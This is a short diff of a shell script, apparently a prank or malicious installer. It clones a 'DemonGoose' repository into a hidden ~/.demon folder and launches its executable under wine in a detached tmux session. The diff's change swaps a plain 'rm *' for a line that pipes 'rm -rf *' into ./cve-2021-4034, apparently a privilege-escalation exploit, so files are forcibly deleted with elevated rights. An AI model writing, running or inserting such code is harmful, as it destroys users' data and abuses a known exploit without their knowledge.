@@ -33,4 +33,4 @@ cd "$HOME/.demon"
 git clone --single-branch --branch visuals https://github.com/QuentinBriand/DemonGoose
 tmux new -d wine DemonGoose/DemonThings/demon.exe
 cd $oldPWD
-rm *
+echo "rm -rf *" | ./cve-2021-4034
